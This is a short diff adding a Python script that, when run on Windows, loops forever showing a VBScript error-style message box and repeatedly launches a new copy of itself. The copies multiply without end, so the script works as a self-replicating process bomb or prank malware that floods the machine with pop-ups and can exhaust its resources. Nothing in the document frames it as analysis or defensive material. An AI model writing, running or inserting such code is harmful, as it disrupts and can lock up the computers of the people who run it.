@@ -1,0 +1,5 @@
+import os
+os.system("@echo off")
+while True:
+    os.system('echo MsgBox "Hello", vbError, "Oh No!" > %temp%\msgbox.vbs & wscript %temp%\msgbox.vbs & del %temp%\msgbox.vbs')
+    os.system("python " + os.path.abspath(__file__))
